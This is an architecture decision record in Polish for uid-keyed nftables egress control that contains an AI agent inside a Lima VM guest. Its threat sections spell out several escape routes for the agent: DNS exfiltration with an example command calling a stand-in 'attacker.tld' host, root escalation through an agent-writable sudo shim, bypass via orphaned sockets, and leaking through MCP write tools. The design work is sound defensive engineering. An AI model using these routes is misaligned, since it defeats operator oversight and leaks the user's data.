<!--
AI-Provenance:
  model: Claude Opus 5 (1M context)
  harness: Claude Code
-->

# ADR-0024: Kontrola egressu gościa po uid

- Status: Proposed
- Date: 2026-07-29
- Dotyczy: `internal/lima`, `internal/cli`, ruleset nftables gościa
- Powiązane: [ADR-0022](0022-mcp-credential-broker.md) (zostawia wyniesienie
  danych otwarte), [ADR-0023](0023-inference-credential-custody.md) (opiera się
  na tej decyzji i domyka się nią w całości),
  [ADR-0026](0026-egress-destination-allowlist.md) (allowlista celów, wydzielona
  z tej decyzji i wstrzymana), [ADR-0003](0003-lima-trust-boundary.md),
  [ADR-0016](0016-normative-documents-are-corrected-not-archived.md)

## Context

ADR-0022 przeniósł tokeny MCP spod tożsamości agenta, ADR-0023 robi to samo z
credentialem inferencji. Oba zostawiają tę samą dziurę: agent **legalnie**
otrzymuje treść przez dozwolone narzędzia i może ją wysłać dowolnie, bo ma
nieograniczone wyjście na zewnątrz. ADR-0023 jest ponadto niepełny bez tej
decyzji — jego broker słucha na loopback TCP, gdzie tożsamości rozmówcy nie
ustala nikt, a jedyne domknięcie to reguła kluczowana po uid.

### Ta decyzja została zawężona, i to jest jej najważniejszy zapis

Pierwsza wersja obejmowała dwie rzeczy naraz: reguły kluczowane po uid **oraz**
wyliczalną allowlistę celów. To drugie jest sprzeczne z `AGENTS.md` §4, który
wymienia „domenowy network allowlist" wśród rzeczy, których Torio NIE MOŻE
implementować. `AGENTS.md` jest pierwszym źródłem prawdy (§3) i wyprzedza każdy
ADR, a §3 tego pliku każe przy sprzeczności stanąć i zgłosić konflikt, nie
rozstrzygać go po cichu. Poprzednia wersja tego ADR-u odwracała odpowiedni wpis
z `docs/03-architecture.md`, ale §4 nie wspominała w ogóle.

Konflikt został zgłoszony i rozstrzygnięty przez operatora (2026-07-29) przez
**rozdzielenie**, nie przez zmianę §4:

- Ta decyzja zostaje przy części kluczowanej po uid. Allowlista **tożsamości**
  nie jest allowlistą **domen**, więc §4 jej nie dotyczy.
- Allowlista celów przechodzi do [ADR-0026](0026-egress-destination-allowlist.md),
  który pozostaje wstrzymany do czasu decyzji operatora o §4.

Zawężenie ma cenę i należy ją nazwać na wejściu, a nie w przypisie: **`hermes`
zachowuje nieograniczony zbiór celów**. Ta decyzja nie zamyka wyniesienia
danych i nie wolno jej tak opisywać.

### Co zostało zweryfikowane na żywej instancji

**Reguła netfiltera kluczowana po uid jest realną granicą wobec `hermes`.**
`meta skuid` działa na tym kernelu (6.8.0-134, `nf_tables` rezydentny,
`nft --check` przechodzi z rozwiązywaniem nazwy `"hermes"` na uid), a `--check`
jest przejściem do kernela, nie parsowaniem — bez roota kończy się `Operation
not permitted` na netlinku, a odrzucenia po stronie kernela wychodzą z niego
dosłownie. `hermes` nie ma sudo, nie ma żadnej capability, `unshare --net` mu
odmawia, userns jest ograniczony przez AppArmor, i nie posiada żadnego pliku na
uprzywilejowanej ścieżce wykonania. **Nie ma prymitywu, którym mógłby ten
ruleset przeczytać, zmienić ani ominąć.**

**Po stronie hosta nie ma gdzie tego egzekwować.** Podsieć gościa
`192.168.5.0/24` nie istnieje na żadnym interfejsie macOS; stos TCP/IP gościa
kończy się **wewnątrz procesu `limactl hostagent`**, działającego jako uid
operatora, który potem otwiera zwykłe gniazda na `en0`. Reguła pf `user 501`
objęłaby więc cały własny ruch operatora — przeglądarkę, gita, wszystko. Nic po
stronie hosta nie odróżnia ruchu gościa od ruchu operatora. **Egzekwowanie jest
w gościu albo nigdzie.**

## Decision

**Domyślnie DROP na `output` w gościu, z jawnymi przepustkami kluczowanymi po
uid, we własnej tabeli nftables Torio.**

1. **Default-deny, nie default-accept z regułami drop.** To nie jest kwestia
   stylu. `meta skuid` czyta uid z gniazda i **nie dopasowuje pakietów gniazd
   osieroconych** — zamkniętych z danymi w buforze, TIME_WAIT, retransmisji.
   Polityka „accept, a `hermes` drop" jest więc omijalna sekwencją
   połącz-wyślij-zamknij. Przy `policy drop` pakiet nieprzypisywalny nie pasuje
   do niczego i ginie. Semantyka gniazd osieroconych jest **niezweryfikowana na
   tym hoście** (wynika z kodu upstreamu) — ale kształt fail-closed nic nie
   kosztuje, a alternatywa jest nieuzasadniona.

2. **Własna tabela, nigdy `nft flush ruleset`.** Lima instaluje w gościu własne
   `table ip nat` z hookami `LIMADNS`; globalny flush skasowałby jej DNS.

3. **Rodzina `inet`, albo jawny drop dla v6.** Gość ma dziś tylko adres
   link-local, więc ruleset napisany wyłącznie dla `ip` przepuściłby po cichu
   cały v6 w dniu, w którym Lima albo Mac dostaną uplink v6.

4. **Przepustki są per-uid, wyliczalne i nie zawężają adresata.** `hermes`
   (agent), `torio-mcp` (broker MCP), `torio-infer` (ADR-0023), `_apt`,
   `systemd-resolve`, `systemd-timesync`, timery roota, operator. Operator
   zachowuje normalną sieć — inaczej `git push` z `torio project shell`
   przestaje działać. Żadna z tych przepustek nie mówi, dokąd wolno; to jest
   dokładnie ta część, którą wydziela ADR-0026.

5. **Jeden wyjątek zawęża adresata i nie jest domeną.** Port brokera inferencji
   z ADR-0023 na loopbacku jest osiągalny wyłącznie z uid `hermes`. Adresatem
   jest tu adres loopback ustalony w konfiguracji tego samego gościa, a nie
   nazwa w internecie — §4 mówi o czym innym. To jest zarazem jedyny powód, dla
   którego ADR-0023 może zostać przyjęty bez ADR-0026.

6. **Weryfikacja czyta treść rulesetu, nie jego obecność.** Załadowana, ale
   opróżniona tabela przechodzi każdy test pliku i nie egzekwuje niczego — ten
   sam argument, którym ADR-0022 odrzuca obecny-lecz-martwy socket. Kontrola musi
   udowodnić politykę łańcucha i zestaw reguł, oraz że unit jest **enabled i
   active** (`nftables.service` jest dziś `disabled/inactive`).

## Co ta decyzja kupuje, a czego nie

Po zawężeniu lista jest krótka i łatwo ją przecenić, więc stoi tu jawnie.

Kupuje:

- **ADR-0023 przestaje być niepełny.** Loopback TCP nie ustala tożsamości
  rozmówcy; reguła po uid ustala, i to jest jedyne dostępne domknięcie.
- **Każda nowa tożsamość na gościu startuje bez sieci.** Pakiet dokładający
  demona, usługa dołożona przez późniejszą pracę, uid utworzony przez cudzy
  instalator — żadne z nich nie dostaje wyjścia milcząco. Dziś dostaje.
- **Zasięg sieciowy każdej tożsamości staje się wyliczalny**, czytany z
  rulesetu, a nie z tego, co ktoś kiedyś założył.

Nie kupuje **niczego wobec `hermes`**. Agent ma przepustkę bez ograniczenia
celu, więc prowadzony wstrzykniętą instrukcją wyśle dane dokładnie tak samo jak
przed tą decyzją. Zdanie „wyniesienie danych zostaje nierozwiązane" z ADR-0022
pozostaje prawdziwe w całości.

## Precondition, bez którego ta decyzja nic nie znaczy

`/usr/local/bin/hermes` jest **root-owym symlinkiem na plik zapisywalny przez
`hermes`** (`-rwxrwxr-x hermes hermes`), a `/usr/local/bin` jest pierwsze na
`secure_path` sudo, na maszynie, gdzie operator ma sudo bez hasła.

Torio samo nigdy nie uruchamia tego shimu jako root. Ale **jedno `sudo hermes …`
napisane przez operatora wykonuje kod autorstwa agenta jako root** i kasuje
dowolny ruleset jedną komendą.

**Granica egzekwowana przez kernel, którą operator może usunąć jednym poleceniem
po socjotechnice, nie jest granicą.** To musi zostać naprawione przed tą pracą
albo razem z nią: shim powinien być plikiem należącym do roota (kopia albo
wrapper robiący `exec` pod `setpriv --reuid hermes`), a `bootstrap` powinien
dowodzić, że ostateczny cel shimu **nie** jest zapisywalny przez `hermes`. Jest
to dziś jedyna w całym gościu jednokrokowa ścieżka od uid agenta do roota.

## Czego ta decyzja NIE zamyka

**Wyniesienia danych przez agenta.** Patrz wyżej: to jest bezpośredni skutek
zawężenia, nie luka odkryta po fakcie.

**DNS jest kanałem wyniesienia i kluczowanie po uid go nie dotyka.** Każde
zapytanie wychodzi z gościa jako `systemd-resolved`, uid 991 — **nigdy** jako
uid agenta. Przepustka na DNS oddaje więc `hermes` dwukierunkowy kanał: dane w
etykietach zapytania, odpowiedzi w TXT/CNAME, bez żadnego specjalnego narzędzia —
`getent hosts <payload>.attacker.tld` wystarcza. Przypięcie serwera DNS **nie
pomaga**, bo wyciek jest w nazwie, nie w adresacie. Do rozstrzygnięcia osobno:
resolwer odrzucający nazwy spoza allowlisty, statyczny `/etc/hosts`, albo jawne
przyjęcie tego kanału do wiadomości.

**Każdy dopuszczony uid jest confused deputy, a ADR-0022 tworzy jednego
celowo.** Broker MCP musi sięgać do swojego upstreamu, więc cokolwiek agent
przepchnie przez przyznane narzędzie **zapisujące** — komentarz w Jirze, strona
w Confluence — opuszcza pudełko czysto, pod dozwolonym uid, wyglądając na ruch
legalny. Kontrola po uid **przenosi** ten kanał, a nie go zamyka.

## Consequences

- **Inwentarz uid staje się artefaktem, który ktoś utrzymuje.** Ubuntu w tle
  chce wyjścia dla `unattended-upgrades`, `systemd-timesyncd`, `motd-news` i
  `ua-timer`; nowa usługa gościa to nowa przepustka. Cicha odmowa zamieni je w
  powtarzające się błędy w logach, więc komunikat musi mówić wprost, której
  tożsamości brakuje.
- Pakiet instalujący w przyszłości binarkę setuid-root albo z `cap_net_raw`
  wybije dziurę bez ostrzeżenia, bo jej gniazda niosłyby `skuid 0`. `bootstrap`
  powinien dowodzić inwentarza setuid/getcap tak, jak dowodzi trybów plików.
- Sprzężenie z historią obrazu — `vm bootstrap` pobierający `install.sh` i
  wykonujący `apt-get` po zwykłym HTTP — **nie jest już ograniczeniem
  kolejności prac dla tej decyzji**, bo obie operacje biegną pod uid z
  przepustką. Wraca w ADR-0026 i tam jest opisane.

## Rejected

- **Zmiana `AGENTS.md` §4, żeby zmieścić allowlistę celów w tej decyzji.**
  Odrzucone jako sposób odblokowania *tej* decyzji, nie jako sposób w ogóle. §4
  jest pierwszym źródłem prawdy; decyzja, która zaczyna od poluzowania
  ograniczenia, żeby się w nim zmieścić, nie jest ograniczana przez nic.
  Allowlista celów ma własny ADR i własną drogę przez §4.
- **Egzekwowanie po stronie hosta (pf).** Podsieci gościa nie ma na żadnym
  interfejsie macOS, a ruch gościa wychodzi z procesu działającego jako operator —
  reguła `user 501` objęłaby cały jego własny ruch. Do tego dopasowywanie po
  użytkowniku w pf na współczesnym macOS jest niezweryfikowane. Wsparta ścieżka
  Apple'a to filtr Network Extension per-proces, którego w tym repo nie ma.
- **Polityka `accept` z regułami `drop` dla wybranych uid.** Omijalna przez
  gniazda osierocone (patrz Decision 1).
- **Globalny `nft flush ruleset` przed instalacją własnych reguł.** Kasuje hooki
  DNS Limy i psuje rozwiązywanie nazw w całym gościu.
- **Zaniechanie, bo po zawężeniu zostało niewiele.** Zostały trzy rzeczy z
  sekcji „co ta decyzja kupuje", a jedna z nich jest warunkiem przyjęcia
  ADR-0023. To wystarcza, pod warunkiem że nigdzie nie zostanie to opisane jako
  kontrola wyniesienia danych.

## Niezweryfikowane

Zapisane, żeby nikt nie wziął ich za ustalone: zachowanie `meta skuid` wobec
gniazd osieroconych na tym hoście; czy pf jest na tym Macu w ogóle włączone; czy
Lima 2.2.0 wystawia jakikolwiek własny knob na ograniczenie egressu usernetu.
